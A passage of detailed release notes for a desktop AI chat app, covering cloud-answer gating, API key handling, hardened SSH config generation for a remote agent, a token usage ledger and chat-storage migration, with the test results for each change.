  passing, seven single-call failures (wrong X25519, a throw, wrong
  Ed25519 key, an accepted forgery, wrong XChaCha, a tampered box
  opened, wrong Argon2id) each "error", the hook "missing", no network
  or log in the section; the install guard (the app on its venv, a dev
  copy on it, its own venv, not a venv, frozen, a name-prefix
  neighbour); the pins by case; when to try (a new build, a new Python,
  a success, a failure at 2 and 3 days) and pip's failures read
  (offline, no versions, a hash error); the thread behind the lock; the
  gate by case (no flag, a dev copy on the real server, a test server,
  no PyNaCl, installing, the shipped app) and the pane's and an
  action's wording; the SYNC_URL lint, and the lint catching six plants
  (a function, a class's method, a class body, a module line, the host
  literal, a second assignment). Live: A ready, accounts off for want of
  a test server; CRY-4 on a copy with `no-nacl` and SYNC_URL pointed at
  a counting listener (missing, accounts off with the pane's sentence,
  no pip, zero connections, then one, the gauntlet's own, as the
  control); the Account pane's paint and the poll's repaint run in
  node; three throwaway venvs: one inside its copy's folder installs
  from the pinned wheels (1.6.2, 2.1.1, 3.0, the pip argv with the
  hash, wheel, timeout and retry flags, the temp file gone, the attempt
  recorded, accounts on with a test server named), one with a pynacl
  wheel one byte longer installs nothing (pip's hash error on
  /api/stats, the failure recorded; the next start runs no pip and says
  when it tries again; with the record set 4 days back it tries once
  more), one outside its copy's folder (the shared-venv case) installs
  nothing, runs no pip and records nothing; `--crypto-selftest` exit 0
  and 1, with no data folder made; the build scripts and workflows,
  `-Arch` (the parameter's name never assigned or looped over, in any
  case), the build venv's remake and the per-user ISCC by source.
  64 mutations each fail at least one check: no --require-hashes in
  the app's pip call, the .bat, the ps1 or the Mac launcher; pynacl's
  hashes gone; the known-answer test skipped whole, from the forgery
  checks on, or its Argon2id answer, and Argon2id back to 1 pass; the
  install guard's folder rule gone, and with the venv rule; the hidden
  import dropped, moved to x64 only, and without --collect-submodules;
  the ps1's self-test throw and the CI step gone; the gate ignoring
  crypto, or the real server in a dev copy; a reader of SYNC_URL
  outside _sync_url, _sync_url ungated, the host named outside
  SYNC_PROD; ACCOUNTS = True; retrying at every launch or after 1 day;
  no attempt record; no --timeout/--retries; offline or "no versions"
  unmapped; the thread without the lock; the no-nacl hook ignored;
  /api/stats without crypto; the pane not painting, saying "nothing
  was sent" or "Try again", or not repainting (two ways); deps-3 kept;
  the smoke's assertion and the nightly's install gone; all three pins
  on Windows; --force-reinstall gone from the ps1 or the Mac build
  venv; -Arch ignored, no param block, no per-user ISCC, the build venv
  kept across interpreters; and from the re-verify: the parameter
  named Arch again, a lower-case $want assigned, a loop over $WANT;
  production compared as a string, an unparseable URL allowed, the
  trailing dot kept; a success never retried, any time accepted, a
  future time accepted; SYNC_PROD read outside the gate, a nested
  reader named accounts_gate; platform.machine() back in Get-PyArch,
  for the chosen Python or for the build venv's identity; win-arm64
  unmapped; the exe's platform unchecked in the ps1 or in CI; the
  self-test JSON without platform. One of those first crashed the
  check instead of failing it (a NaN time made the function raise);
  the check now records a raise as a result. Three of the first round
  first slipped
  through (a check that found the throw's text but not its condition,
  one fooled by find() returning -1, and a mutation that didn't apply)
  and were tightened.
- Verified by hand: the pins installed and passed the known-answer test
  on Python 3.14 arm64 (the app's venv Python, into a scratch folder),
  3.9 arm64 with the Command Line Tools' pip 21.2.4, and 3.9 x86_64
  under Rosetta; the zip built with crypto-requirements.txt in it;
  ci_smoke.sh green with PyNaCl and red without it.
- Not verified here: any Windows run (the .bat's pip line, the frozen
  x64 exe's self-test in CI, the ARM64 frozen build with Qt, `-Arch`
  and the build venv's remake under real PowerShell 5.1, the zip on a
  PC with pythonnet's cffi loaded); build_macos_app.sh end to end (it
  installs into the real venv) and the launcher's first run on a fresh
  Mac; an Intel Mac and macOS 11 for real.
- **Patrick:** build and install-test the ARM64 Inno build in the VM:
  `powershell -ExecutionPolicy Bypass -File build_windows_exe.ps1 -Arch
  arm64` under an ARM64 Python 3.11 or newer. It stops if the exe's
  crypto self-test fails, and prints the JSON either way. The first
  start of this build on each computer installs PyNaCl into the app's
  venv once, from PyPI, hash-checked (again only for a new build or
  Python, or 3 days after a failure).
- Still open (plan risk): pythonnet below 3.15 means Windows zip users
  on Python 3.15 can't start the app at all; its own task.

## 6b326 — cloud only with the switch, SSH keeps its own host list, nothing personal on command lines (accounts step 6)
The spec's 0a 5.5 (item 5), the isolation half of 5.12 (item 13), and
5.1 (item 1) apart from its per-profile parts: M6 of the sign-in plan,
reworked the same day to Patrick's rule and three reviews. Before this
an Advanced list turned the cloud on by itself, a late 401 could mark a
freshly pasted key failed, a failed paste replaced a working key,
`/api/title` kept a whole cloud conf (key included) for 5 minutes, and
`ps` showed prompts, the text being read aloud and the Remote agent's
server and commands.
- **Patrick's rule (2026-09-28):** "if the user wants to use a paid API
  key, they enter it. If they have a free API key, they enter it. If
  there are cloud services that don't require an API key at all, then
  those should just run regardless." A saved key is permission to use
  it. Use cloud power decides one thing: whether chats are answered by
  cloud models.
- **The chat gate.** `cloud_allowed(cloud_only)`: true while Use cloud
  power is on, or for a question asked on the Cloud Only tier; settings
  that can't be read count as off. Everything that is part of answering
  a chat asks it:
  - the Fast lane and a pasted picture read in a chat, through
    `gate_ladder(ladder, req_cloud, cloud_only)`: an Advanced run's
    `cloud: [...]` list only narrows the ladder (`[]` still means none);
    it used to open it;
  - the council's cloud bench (a named `bench_allow` engaged it with the
    switch off) and its merge (a named cloud compositor reached the cloud
    with the switch off; now it only picks which cloud);
  - the funnel, the Remote agent's driver, titles, the X-Models header,
    and the memory pass and place pins, which ask again when the answer
    ends (from review: cloud power turned off mid-answer still sent the
    turn).
- **Not gated: a saved key is used.** Gemini pictures and Veo run
  whenever a working Gemini key is saved. Model discovery
  (`_cloud_refresh_picks`) and the Kimi balance run as before this step:
  discovery once per launch at the first `cloud_ok_providers()` call,
  the balance when Settings asks. Services that need no key (search,
  weather, maps, backdrops) are untouched.
- **When a picture or video can't be made** (no studio installed, no
  working Gemini key), nothing is sent and the reader is told
  (`studio_needs`): "Add a Gemini key in Settings › Cloud power, or add
  image generation under Settings › Models › Manage models." (video the
  same); off Apple silicon the line starts "Making pictures on this
  computer needs an Apple silicon Mac." A Gemini attempt that fails says
  so and names the same place. `_veo_video` checks for the key before it
  reserves one of the day's clips (a request with no key used to spend
  one).
- **What the switch now changes that it didn't:** with it off, an
  Advanced run's named cloud voices and cloud compositor run locally.
  The Advanced picker says so ("Cloud power is off, so these and a cloud
  compositor sit out."), and the vision download message adds, when a
  Claude or Gemini key is saved, that turning the switch on reads the
  picture now.
- **The switch shows what saved:** its change handler waits for
  `POST /api/prefs`; a failure (unreadable settings, 503) puts the box
  back and says "Couldn't save that. Cloud power is still off/on."
- **Saving a key still turns cloud answers on** (`_set_turbo(True)` in
  the key-save route, unchanged): under Patrick's rule a key saved is
  permission to use it, and the reply says "cloud answers are on". The
  key box stays open with the switch off (it used to fold for someone
  with keys and the switch off), so a key can be pasted or replaced
  without switching chats to the cloud first.
- **The Cloud power copy:** "Optional frontier models. While Use cloud
  power is on, cloud models answer your chats; the Cloud Only tier does
  that for one question. Pictures and videos made with Gemini go to
  Google whenever a Gemini key is saved, switch on or off. The switch
  never removes a key." then 6b310's web-search sentence. The hint:
  "Answers come from a cloud service instead of this computer. Your
  prompts leave this computer while this is on, and whenever you pick
  the Cloud Only tier. Pictures and videos use a saved Gemini key either
  way; keys stay saved when it is off." The page no longer rewrites it
  with one provider's name.
- **A failed paste never replaces a working key** (from review; older
  than this step). A key that failed its test used to be saved over the
  provider's entry, so a wrong paste, being offline, a DNS failure or a
  timeout lost the key that worked. `_cloud_save_failed` keeps a working
  entry exactly as it was and the reply ends "Your saved Groq key is
  unchanged and still in use"; a failed paste is recorded only where no
  working key was. The same key pasted again and failing for anything
  but the provider rejecting it (no network, a timeout) leaves its entry
  as it was too; a rejection marks it failed (a 403 on a key `/models`
  just answered for isn't a rejection). A key that met only busy
  answers (every model 5xx) and no model list was never checked: it is
  saved only through the same rule, and the reply says the provider is
  busy. `provider: "off"` removes cloud.json inside the cloud lock, so a
  writer that had read it first can't write every key back.
- **Failure writes (5.12).** `cloud_note_failure` is one locked update:
  the read, the decision and the write happen inside one `_cloud_txn`,
  and only while the provider's saved key is the key the failing request
  used. Keys are compared by `_key_fp` (HMAC-SHA256 under a secret made
  at each launch, memory only) with `compare_digest`. The write goes
  through `_cloud_patch(pid, key, fields, drop)`, which writes only
  `status`, `note`, `cool`, `dead` and `dead_at`, never `key`, `base` or
  `name`, and nothing when the key has changed. `cloud_cool` takes the
  key (keyword-only) and goes through the same patch; `cloud_glitch`
  checks the key and rests the model under the lock. The key save revives
  its models after the write, so an old key's failure landing in between
  can't rest or retire them. A 401, 404 or 429 that comes back after the
  key was replaced or removed changes nothing.
- **Cached answer settings hold no key, and belong to one chat.**
  `_answered` and `_last_cloud` hold a ticket, `{pid, fp, model, name}`,
  not the conf. `_last_cloud` is keyed by (user, chat id), and the page
  sends the chat id with `/api/title` (from review: it was per user, so a
  funnel or another chat could be titled by this chat's provider).
  Titles, the memory pass and the place pins re-read the key under the
  cloud lock (`_ticket_conf`) and make no call when the provider is
  gone, its key is empty or no longer the one that answered, or it is
  marked failed. A council merge the app throws away (too short,
  degenerate) drops its ticket, so the local merger's answer gets no
  cloud badge, title or memory pass from that provider. The cloud badge
  itself needs no chat id; only the title ticket does.
- **The Remote agent's SSH (5.1, G9).** Every call writes a 0600
  `run/ssh-*.conf` (deleted when it returns) and runs `ssh -F
  ssh-*.conf concorde-remote <fixed shell>` in run/: the path is
  relative because ssh hands it unquoted to the ssh it starts for a jump
  host, and "Application Support" has a space.
  - Before the Host block, for every hop: `UserKnownHostsFile
    <app_dir>/remote_known_hosts` (0600, beside remote.json, never
    synced), `GlobalKnownHostsFile /dev/null` (`NUL` on Windows),
    `HashKnownHosts yes`, `StrictHostKeyChecking accept-new`, BatchMode,
    ConnectTimeout 12, ServerAliveInterval 30, `LogLevel ERROR` (the
    one-time "Permanently added" line stays out of the output), and the
    key; on a Mac `IgnoreUnknown UseKeychain` and `UseKeychain yes`
    (keys unlocked from the keychain keep working); an IdentityAgent
    that ssh's config named (1Password and the like); a `Host <hop>`
    block with a jump host's own key. In the block: HostName, User,
    Port, `IdentitiesOnly yes` for a key typed into the app (not one
    that came from ssh's config), and an optional ProxyJump (a new
    field, `[user@]host[:port]` hops).
  - Fields are checked whole (fullmatch): host, user (DOMAIN\user
    allowed for Windows OpenSSH servers, written quoted with the
    backslash doubled), an ASCII port 1-65535, a key path with no quote,
    control character, `${` or trailing backslash, the jump hops. `%` is
    doubled in paths. So nothing typed can add a directive (ProxyCommand
    runs a local command).
  - The command goes on stdin, as typed. The fixed shell, which any
    login shell runs (sh, bash, zsh, dash, csh, tcsh): `exec sh -c 'if
    command -v bash …; then exec bash -c "c=\$(cat); eval \"\$c\"
    </dev/null"; else c=$(cat); eval "$c" </dev/null; fi'`. The whole
    command is read first, so a command that reads stdin gets nothing
    and a lone `}` can't break the framing; the exit status is the
    command's. Output is bytes, decoded UTF-8; CRLF and a bare CR (a
    progress bar) become newlines.
  - **Existing setups keep working with no action.** `-F` replaces
    `~/.ssh/config`, which the app never reads. A setup saved by an
    older build (no `resolved` in remote.json) runs `ssh -G -l <user>
    [-p <port>] -- <host>` once: ssh reads its own config and prints the
    result without connecting; the host is on that one command line for
    that moment. HostName, User and Port are taken (the app's user, and a
    port other than 22, go in as the app always sent them, so they still
    win). A ProxyJump from the config is resolved hop by hop with its
    own `ssh -G` and saved as `user@hostname:port` (an alias means
    nothing under -F), with the hop's own key, if the config gives one,
    in `jump_keys`. Only in this one-time migration, a blank key field
    takes the config's IdentityFile (when the file exists and isn't one
    of ssh's default names, which ssh tries anyway), marked `key_src:
    "config"`. An IdentityAgent comes across (`agent`). All of it is
    saved into remote.json, but only while the file still holds what
    was resolved, so an edit made meanwhile stands.
  - Save (and Test, which saves first) leaves remote.json untouched when
    the form holds what is saved already, so a migrated setup keeps its
    jump keys, agent and key source and an unmigrated one isn't marked
    resolved before its one-time lookup. A change keeps the agent, the
    jump keys while the jump is unchanged and the key source while the
    key is unchanged, and marks the setup `resolved` (typed values are
    never re-read); a write that fails answers ok:false with the reason.
    Hops are read as ssh -G prints them, an address in brackets
    (`root@[203.0.113.5]:2222`), and an IPv6 hop is kept in brackets
    (`ops@[fe80::1]:22`).
  - Settings typed into the app are saved `resolved: true`. A
    connection that fails with "Could not resolve hostname" or
    "Permission denied (publickey)" resolves again (no key copied) and
    tries once more; `ssh_run` updates the caller's copy in place, so an
    agent run resolves at most once and again at most once, not at every
    command. A ProxyCommand from the old config isn't carried over. If
    it still fails the reply ends "ConcordeAI connects with its own
    settings; put the server's real address, user, port and key here."
    ssh-copy-id is no longer offered as the fix for a failure (it stays
    as the setup hint on a fresh box).
  - `~/.ssh/known_hosts` is never read or written, so each server gets
    one fresh host-key accept on its first connection after this build.
    Entries earlier builds wrote there stay.
  - **A changed server:** "Host key verification failed" or
    "IDENTIFICATION HAS CHANGED" adds "This server's identity changed
    since ConcordeAI first connected. If you rebuilt it, forget its old
    key." `/api/remote/test` says `changed`, and the connection bar shows
    **Forget its old key**: `POST /api/remote/forget` removes, from the
    app's own list only, the host ssh named in "Host key for <name> has
    changed" (a jump host's, when that one changed), but only when that
    name is this server or one of its jump hosts (ssh's lines come with
    whatever the server printed, and the name is kept process-wide);
    otherwise the server and every jump hop: each `|1|salt|hash` line whose
    HMAC-SHA1(salt, name) matches (`[host]:port` off port 22), and any
    plain line naming it. A list it can't read or write comes back as a
    JSON error, and no temp file is left (the same for remote.json's
    writer). Error text now keeps its tail (ssh's useful line is its
    last).
  - "ssh client not found" only when `ssh` itself isn't on the PATH.
- **Read-aloud (5.1).** On a Mac `say -f <run/say-*.txt>`: the text in a
  0600 file, deleted by a reaper thread when `say` exits and by
  `_stop_speaking`. `_stop_speaking` waits for the process to end (5 s,
  then kill); on Windows it ends the PowerShell tree with `taskkill /PID
  <pid> /T /F`. On Windows the text still goes to SAPI on stdin, written
  on a short thread (`_say_feed`), so `_say_lock` covers only the start
  and a Stop never waits behind PowerShell. `_speak` and `_stop_speaking`
  share the lock, so two at once can't both start a voice.
- **Picture and video prompts (5.1).** mflux and the video renderer run
  under `_PROMPT_RUNNER`, a fixed `python -c` script: the command line
  carries `@prompt:prompt` (and `@prompt:neg`), the words sit in a 0600
  `run/prompt-*.json`. The runner drops the working directory from
  `sys.path` before its own imports (a `json.py` there can't stand in),
  reads the file and deletes it, puts the words back in `sys.argv`, then
  runs the console script with its own folder first on `sys.path`
  (`runpy.run_path`) or the module with the working directory first
  (`runpy.run_module`, as `-m` would). The app deletes the file again
  when the render ends: done, failed or stopped.
- **Leftovers:** at every start the copy holding the instance lock
  removes `run/ssh-*.conf`, `run/say-*.txt` and `run/prompt-*.json` a
  crash left (`sweep_run_files`).
- **Test hooks (0a 5.14), dev copies only:**
  `provider-stub=http://127.0.0.1:<port>` points the four compiled
  provider addresses (`PROVIDER_BASES`, and `GEMINI_API` for pictures and
  Veo) at a recording stub, the provider's host becoming the first part
  of the path so `_provider_of` still reads it; anything but a loopback
  URL is ignored. `subprocess-record` appends every child's argv to
  `run/subprocess.jsonl`. `no-downloads` makes `start_model_downloads` a
  no-op. `ssh-config=<file>` hands `ssh -G` a stand-in for
  `~/.ssh/config`, so the gauntlet never has ssh read the real one. The
  key-save route, Gemini pictures and Veo read their addresses from
  those names.
- Gauntlet: 37 new checks and 9 older ones updated; 347 becomes 384.
  Two copies on 9903 run with the stub as their provider base and
  HTTPS proxy (a request to a real provider host would be recorded as
  a CONNECT and refused), the Hub offline for any engine they start:
  - no key saved: start, Settings and a restart reach no provider;
    pictures and video give the no-key lines;
  - four sentinel keys, switch off: discovery reaches all four and
    Settings shows the Kimi balance; the Fast lane with an Advanced
    list, a pasted picture and a council naming cloud voices and a cloud
    compositor send nothing to a provider; a picture and a video are made
    with the Gemini key;
  - switched on, the Fast lane reaches the stub, a title for that chat
    goes to that provider and one for another chat doesn't;
  - KEY-9's delayed 401 (the stub's 401 sent after the replacing save
    returned: the new key saved and ok); a rejected paste and an
    unreachable one each leave the working key saved and ok;
  - the Remote agent against a local sshd: an old alias setup resolved
    once through `ssh -G` (the stand-in config) and kept; a rebuilt
    server named as changed, Forget, then connected; through a jump
    host; an unresolvable host failing with the plain line;
    `~/.ssh/known_hosts` byte-identical by digest; the app's list
    hashed and 0600; every ssh command line `ssh -F ssh-*.conf
    concorde-remote <shell>` with no host, user, port, key path or
    command on it; no config left.
  In-process: the failure write and patch; tickets (a replaced, emptied,
  failed or removed key, and memory following the switch); the gate and
  `gate_ladder`; the council off and on, and a thrown-away merge;
  discovery, balance, pictures and video not asking the switch; the
  glitch's lock, `off` under the lock, revive after the write, per-chat
  titles, the switch's revert, the no-key lines; read-aloud (and
  Windows' writer thread off the lock); the prompt files and the runner
  for real (deleted once read, its path, a shadowing json.py); the
  start's sweep; the SSH config's fields read back by `ssh -G -F` (the
  generated file only); the remote shell under zsh, tcsh, bash, dash and
  a PATH with no bash (a heredoc, `exit 7`, a lone `}` then `cat`, a
  trailing backslash, stdin readers); ssh's output (CR, not found, one
  resolve-and-retry, a changed server); Forget against entries
  `ssh-keygen -H` hashed; and a lint that no subprocess argument list is
  built from a name that carries what a person typed and no `--prompt`
  takes anything but the placeholder. Also the verifier's fixes: one
  run's snapshot resolving once with a mid-run edit standing, ssh -G
  per hop with jump keys, the key only at migration, the agent and
  keychain lines, Forget by the named host, JSON errors with no temp
  file, the same key offline, an unchecked busy key, the open key box,
  and the badge without a chat id; and the final review's: Save/Test
  leaving a migrated file byte for byte (live), the merge's rules, a
  failed save answering ok:false, bracketed and IPv6 hops (read back
  by ssh -G), Forget ignoring a name from the server's own output, and
  a 403 after /models. 75 mutations (48 of the rework, 17 of the
  verifier's fixes, 10 of the final review's) each fail at least one
  check; a late 401 alone is caught only with both key checks removed,
  since the patch and `cloud_note_failure` each check.
- Not done (left for later, from the final review): a jump host whose
  own config names a further ProxyJump (the chain beyond the first hop
  isn't carried), `ssh://user@host:port` ProxyJump URIs, and the
  Windows local username that `ssh -G` puts in a hop with no user.
- Not verified here: Windows OpenSSH taking `GlobalKnownHostsFile NUL`,
  a `-F` file under `%LOCALAPPDATA%` (its permission check) and
  DOMAIN\user against a real Windows server; the `taskkill /T` stop of
  SAPI; real mflux and video renders through the runner (their venvs
  live in the real data folder; the runner ran on stand-ins); `ssh -G`
  against a real `~/.ssh/config` (the gauntlet uses a stand-in), with
  a 1Password IdentityAgent or a keychain-unlocked key.
  `say -f` was checked writing to a file (`-o`) with a UTF-8 text, not
  played aloud.

## 6b325 — Settings › Usage
Patrick: "in the settings, let's add a tab called usage and show the
user stats like these. Also allow them to select a time period like one
hour, one day, one week, one month, one year, all time." His reference
was a "Usage & Stats" panel: requests, input tokens, output tokens,
cache hit, and a stacked bar chart of input, cached and output tokens.
- The app counted no tokens before this. `quality.jsonl` has one thin
  line per answer (time, tier, model, searched, characters) and is
  deleted at 2 MB. It stays as it was; the new ledger is `usage.jsonl`
  in app_dir() (a dev copy's MILLENAI_HOME).
- One record per model call, written at the five places a prompt leaves
  for a model: `stream_ollama`, `stream_openai_compat` (MLX),
  `_anthropic_stream`, `cloud_stream_conf` (Groq, Gemini, Moonshot) and
  `cloud_text`. Councils, merges, sharpen passes, titles, memory, map
  pins and funnels all go through these, so each call counts once.
  Pictures and video are not counted, nor the key check's 8-token hello.
  A record is stamped with the time the call started.
- Each `/api/chat` answer adds an answer record, under the model that
  wrote it, but only when a model's own text reached the page: the
  chat's model paths are handed `memit`, which notes that, and the
  app's own lines (offline_hint, "That engine stopped responding", and
  `AppText`: the provider-down and declined lines, the remote agent's
  no-driver and can't-connect lines) go through `emit`. Before the
  review this counted characters sent, so a failed question was an
  answer. quality.jsonl still logs every line as before.
- REQUESTS on the pane means model calls; the line under it says how
  many answers they made. A council question is several requests.
- Where the counts come from:
  - Ollama: `prompt_eval_count` and `eval_count` on its last line.
    Ollama counts only the prompt it evaluated, so a prompt it had
    cached reads low; when it leaves the count out (the whole prompt was
    cached) input is estimated. No cache figure.
  - MLX (mlx_lm's server): asked with `stream_options.include_usage`;
    it sends `prompt_tokens`, `completion_tokens` and
    `prompt_tokens_details.cached_tokens`. Seen live: a sharpen pass,
    2,576 in with 1,941 cached. That chunk has `choices: []`, which the
    old parser (`obj.get("choices", [{}])[0]`) would have raised on.
  - Anthropic: input is `input_tokens` + `cache_read_input_tokens` +
    `cache_creation_input_tokens`, cached is the cache read; streaming
    takes input from `message_start` and output from `message_delta`
    (message_start's own output count is dropped, so a stream cut off
    before message_delta is estimated, not taken for exact; a null in
    message_delta never replaces a count).
  - Groq and Gemini's OpenAI layer: asked with
    `stream_options.include_usage`; the usage chunk is read (and
    Groq's `x_groq.usage`). A provider that answers 400 naming
    `stream_options` loses the flag for the rest of the launch and the
    stream is sent again once, so accounting never costs an answer.
    Only a 400, and only before any text has gone out.
  - Moonshot: `usage` in its last choice, sent unasked (not asked, so
    nothing new is sent to it); its `cached_tokens` is read.
  - Buffered calls (`cloud_text`): the reply's `usage`.
  - Nothing reported (a server that ignores the flag, a stream cut
    short, an abandoned council draft): estimated at 4 characters a
    token from the text sent and received, and marked. A call that fails
    before anything comes back is not recorded.
- Cache hit is cached input over the input of the calls that report
  caching (Anthropic, MLX, OpenAI-shaped replies that carry a cached
  count, Moonshot); "—" when none in the range did.
- The pane says in one line when any count in the range is estimated:
  "Estimated from text length: 3 of 40 requests." or, for backfilled
  lines, "Estimated from the old answer log (output only): …".
- Backfill: once, when `usage.jsonl` doesn't exist yet, each
  quality.jsonl line from before this launch becomes one answer and one
  estimated call: output from its character count, input 0, the model
  as logged, "local" when that's a catalog label, else "cloud". It is
  marked done only after the ledger is written (or when there is no old
  log): until then the appends wait on the queue, so a failed write is
  tried again instead of losing the history. An old log that is there
  but can't be read keeps the ledger in memory for that launch.
- Storage: JSONL with short keys (t, s, m, w, n, i, c, ri, o, d, x, a,
  q; the list is in the code). Calls go on a queue that a writer thread
  appends; a chat never waits and every error is swallowed. Appends are
  under a lock, fsynced, 0600; a flush that can't write puts its
  records back at the front of the queue; a line a crash cut short gets
  a newline
  before the next append and is skipped on read. A file that isn't
  there reads as empty; one that can't be opened, isn't ASCII or has
  more bad lines than good (plus one) raises StoreReadError, and the
  route answers 503 "Couldn't read your usage. Nothing was changed."
- Retention: at the first write of each launch, and whenever the file
  passes 1.5 MB (at most hourly), calls older than 14 days roll up into
  one line per hour, model and place, and after 120 days one per local
  day; the file is rewritten atomically (unique temp, fsync, replace)
  and never when it couldn't be read. Totals don't change.
- The queue is flushed at exit (atexit). A SIGTERM or Cmd+Q skips
  atexit; the writer runs within milliseconds of each call, so at most
  the call finishing at that instant is lost.
- `GET /api/usage?range=1h|1d|1w|1m|1y|all&model=` (behind the token):
  the four totals, the answers, one bucket per bar (uncached input,
  cached, output, calls), every model in the data (most calls first),
  the bucket size, the window and the note. Unknown range: 400. Buckets
  are local time: 5 min, 1 hour, 6 hours, 1 day, 1 week (Mondays). 6 h,
  days, weeks and months are wall-clock: bars start at 0, 6, 12 and 18
  on the day the clock changes too (that bar is 5 or 7 real hours, that
  day 23 or 25), so 1 month can be 32 bars. All time runs from the
  first record (at least an hour back) and takes the smallest bucket
  that draws at most 60 bars counted from the floored start (the span
  alone came out one over), else calendar months.
- The ledger lives in app_dir() for now; it moves with the profiles
  (1a), like chats.json.
- The page: "Usage" is the last rail item. The pane has "Usage & Stats"
  with the period (default All time, remembered in
  `millen.usage.range`) and model menus, the four cards, the chart
  (SVG drawn by the page, no library; a title per bar), the legend and
  the note. Numbers: 17,883 · 1.36B · 25.12M · 93.5%. It loads on
  open, on a change and every 30 s while open.
- The rail: six items take the height five did (.snav 6px padding, not
  8; 4px under the spec list, not 12). Measured in headless Chromium at
  1100 x 860: with the release notes shown, About ends 4px above the
  footer and the rail's content is 361px of the card's 521; with no
  notes (offline)
  the rail is 48px taller than About, the same as with five items
  before this build.
- Checked by hand: a dev copy with a seeded quality.jsonl and a live
  MLX answer, in headless Chromium with the bridge stood in: all time,
  1 week and 1 hour draw as in the reference. A Cloud Only question
  with no keys: the page gets the provider-down line, the old log its
  line, the ledger no answer.
- Gauntlet (15 new, the pane-order check extended): the counts of each
  provider's shape; each of the five paths against fake engines and
  providers (reported counts, the start stamp, the MLX and Groq flag,
  Moonshot not asked, the Gemini fallback and its guards, a refused key
  recording nothing, a cut stream estimated, message_delta nulls); a
  failing ledger or usage_note costing no answer; the file (0600, torn
  line, bad file not empty, the requeue, the exit hook); roll-ups
  keeping every total; the backfill once and after a failed write;
  every range's buckets against datetime-worked expectations, the model
  filter and cache hit; a clock change in New York (subprocess);
  All time at most 60 bars; the live route with this run's local
  answers recorded exact; a Cloud Only question with no keys counted as
  no answer; the 503; the pane markup; the formats and chart, and
  paintUsage/loadUsage against canned replies, in node. 35 mutations of
  the new code each fail at least one check run offline.
- Not verified live: the usage fields of Anthropic, Groq, Gemini and
  Moonshot (fakes only; the gauntlet holds no keys), Ollama (this Mac
  runs MLX), and the pane in WebView2 and Qt.

## 6b324 — chats in .v2 files, old builds safe, nothing personal in the web view (accounts step 5)
The rest of the spec's 0b: sections 5.8-5.10, LOC-6 and ISO-10's Phase 0
parts, with the build-time answers Q5, Q8, Q9, Q10, Q13 and Q16 (M5 of
the sign-in plan), and the fixes from three reviews of the first cut.
Before this an older build and this one shared `chats.json` and
`memory.json`, so going back a version could lose or resurrect chats,
and the page kept the tier, Advanced council, agents and Remote autonomy
in browser storage.
- **The .v2 files.** "This computer" keeps its chats in `chats.v2.json`
  (`{"v": 2, "chats": [...], "gone": [...]}`, Q5) and its memory in
  `memory.v2.json` (a list of facts, as before). `gone` holds the ids
  deleted for good (the newest 5,000): a late write to one gets a fresh
  id, and an older build can't bring one back. The 6 s undo stubs stay
  in memory, as in 6b322; a stub found at a start is final. Top-level
  fields this build doesn't know are written back as read.
- **profile.json** (in the data folder) holds `legacy_base` and
  `written`, the record of which of `chats.v2.json`, `memory.v2.json`
  and `prefs.json` have had their first write. After it a missing file
  is a read error (503, nothing written), never empty (0b L1). To start
  a store over on purpose, remove the file and its name from `written`.
- **The legacy files only lose entries (L7).** This build never writes
  anything new into `chats.json` or `memory.json`. Whenever a chat or
  fact leaves the .v2 files it goes from them too, atomically, and then
  `legacy_base` is written: a final delete (a timer 6.5 s after the
  delete, and at a quit), Forget's chats or memory scope and Clear
  memory (both empty the legacy file outright), the 1,000-chat eviction
  and the 200-fact trim. A crash between the two leaves only removals.
  A rewrite that fails is owed: the next write, the delete timer and the
  quit try it again; a delete's id leaves the list of finished deletes
  only once its write has landed. A 6.0.x build takes no instance lock
  and could save while this build rewrites: the rewrite reads the file
  again just before replacing it and, if it changed, starts over, import
  first, so a chat the old build just added is never dropped.
- **legacy_base**: sha256 of each legacy file, each legacy chat id with
  the .v2 id it maps to and a sha256 of the entry itself, and a sha256 of
  each normalised fact (whitespace collapsed, lower case). The per-chat
  hash is this build's addition: it tells a chat an older build changed
  from one this build changed (a Try again here is not an old build's
  edit). The chats half ("chats", "ids") and the memory half ("memory",
  "facts") are written separately.
- **The downgrade import (Q8)**, whenever a legacy file no longer
  matches `legacy_base`, always into root: a chat it doesn't list is
  imported (a fresh id when its own is taken; never one deleted here);
  a listed chat whose .v2 copy is a strict prefix of the legacy one
  takes the new turns; a listed chat whose legacy copy adds nothing is
  left; any other changed listed chat is imported as a new chat with a
  fresh id, and the legacy entry follows that copy from then on (the old
  build's later turns go into it, and deleting it here takes the entry
  out of `chats.json`); a listed chat deleted here stays deleted; a fact
  it doesn't list is imported. A legacy chat whose id root holds, with
  one message list starting with the other, is the same chat (a lost
  `profile.json`): mapped, and extended if the legacy one is longer.
  Anything already in root with the same turns (or fact text) is not
  imported again, so a crash between the .v2 write and `legacy_base`'s
  can't duplicate. A rename or pin made only in the old build is not
  carried over (only turns are), rather than duplicating a chat for it.
- **`_migrate_61` (Q9, and past it)** runs at every start before the
  server is bound, only in the copy holding the instance lock (a copy
  whose lock file couldn't even be opened runs unmigrated, as before
  this step). Chats and memory migrate separately:
  - chats: without `legacy_base`'s chats half, `chats.json` is copied
    into `chats.v2.json`; it is done only once that half is written, so
    a crash part-way copies again. `chats.v2.json` carries `from_legacy`
    until this build's first write of its own: if `profile.json` goes
    missing after the store was used, the legacy file is never recopied
    over it; the half starts empty and the import brings in only what
    root lacks. A `chats.json` it can't read shuts the chats alone
    (503) until a start can read it;
  - memory: `memory.json` is copied into `memory.v2.json` when that isn't
    there yet. A `memory.json` it can't read (6.0.x saved it in place, so
    a crash could cut it) is set aside as `memory.json.unreadable-<time>`,
    bytes kept, and memory starts empty; older builds already read it as
    empty;
  - then, for each, the boot order: the import, the legacy file losing
    every listed entry root no longer holds (this finishes a delete that
    crashed before its rewrite), then `legacy_base` (from 1a, a pending
    Add step 6 goes first). Once a store is migrated nothing shuts it for
    a whole run: a read that fails fails its own request, and recovers
    when the file reads again.
- **The six per-person keys (5.10, Q10).** `millen.tier`, `agent`,
  `codeagent`, `adv`, `advon` and `autonomy` now live in `prefs.json`
  (`tier`, `agent`, `codeagent`, `adv`, `advon`, `remote_autonomy`) and
  the page reads and writes them only through `/api/prefs` (writes are
  queued so two quick changes can't land swapped). The single-model
  pick goes there too (`model`, `council`): tier "" means "this model",
  so it is kept beside the tier, and neither the LocalStorage purge nor
  another port can leave a tier without its model. Their browser keys
  stay on the allow-list, but prefs.json is what the page reads. At every
  boot the page's `storeBoot()` posts what `prefs.json` lacks to the new
  `POST /api/prefs/adopt` (only these keys, well-formed, only where
  absent: the server wins) and removes each of the six from browser
  storage once `prefs.json` holds it; a failed post leaves them for the
  next boot, they count for that session, and what `prefs.json` already
  held still wins. Then every key not on the machine allow-list goes
